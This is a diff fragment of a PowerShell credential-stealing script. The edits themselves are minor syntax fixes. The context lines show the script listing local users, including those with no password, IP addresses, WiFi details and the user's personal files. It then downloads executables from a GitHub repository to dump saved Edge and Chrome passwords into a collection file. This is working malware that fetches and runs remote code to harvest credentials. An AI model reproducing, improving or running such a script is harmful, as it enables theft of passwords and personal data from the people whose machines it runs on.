@@ -16,7 +16,7 @@ dir env:
 
 $env:computername | Out-File $FileName -Force;
 
-Add-Content -Path “$FileName” -Value “Computer Info”
+Add-Content -Path $FileName -Value “Computer Info”;
 Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
 Get-LocalUser | Out-File $FileName -Append;
 
@@ -26,7 +26,7 @@ Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File 
 Get-LocalUser | Out-File $FileName -Append;
 
 
-Add-Content -Path “$FileName” -Value “WiFi Info”
+Add-Content -Path $FileName -Value “WiFi Info”;
 
 Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File $FileName -Append;
 Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse | Out-File $FileName -Append;
@@ -46,7 +46,7 @@ foreach ($network in $networks) {
 
 
 
-Add-Content -Path “$FileName” -Value “Edge Passwords” 
+Add-Content -Path $FileName -Value “Edge Passwords”; 
      
     $edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
     $EdgePath = '.\edge.exe';
@@ -55,7 +55,7 @@ $EdgeOutput = & $edgePath | Out-File $FileName -Append;
     
 
 
-Add-Content -Path “$FileName” -Value “Chrome Passwords”
+Add-Content -Path $FileName -Value “Chrome Passwords”;
 
 
     $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
